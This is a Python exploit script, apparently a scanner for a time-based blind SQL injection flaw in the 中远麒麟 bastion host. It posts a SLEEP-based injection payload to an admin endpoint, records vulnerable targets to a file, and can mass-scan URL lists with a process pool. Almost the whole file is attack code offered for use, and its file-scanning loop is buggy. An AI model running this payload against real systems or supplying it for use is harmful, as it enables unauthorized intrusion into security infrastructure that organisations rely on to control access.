import requests,argparse,time,json
requests.packages.urllib3.disable_warnings()
from multiprocessing.pool import Pool
def banner():
    banner = """欢迎使用中远麒麟堡垒机脚本"""
    print(banner)

def poc(target):
    payload = "/admin.php?controller=admin_commonuser"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    try:
        result = requests.get(url=target,verify=False)
        #print(result.status_code)
        #time1 = result.elapsed.total_seconds()
        if result.status_code == 200:
            result1 = requests.post(url=target + payload,headers=headers,data=data,verify=False,)
            content = json.loads(result1.text)
            # print(content)
            # print(type(content))
            #time2 = result1.elapsed.total_seconds()
            #if time2 - time1 >= 5 or 0 in content["result"]:
            if "result" in content:
                print(f"[+] {target} 存在中远麒麟堡垒机延时漏洞")
                with open("中远.txt","w",encoding='utf-8') as f:
                    f.write(f"{target} 存在中远麒麟堡垒机延时漏洞\n")
            else:
                print(f"[-] {target} 不存在中远麒麟堡垒机延时漏洞")
        else:
            print(f"[-] {target} 无法连接")
    except Exception as e:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser("中远麒麟堡垒机脚本")
    parser.add_argument("-u", "--url", dest="url",type=str,help="目标IP地址",)
    parser.add_argument("-f", "--file", dest="file",type=str,help="目标文件地址",)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
                mp = Pool(20)
                mp.map(poc,url_list)
                mp.close()
                mp.join()
    else:
        print("参数错误,请使用-h查看帮助")


if __name__ == '__main__':
    main()
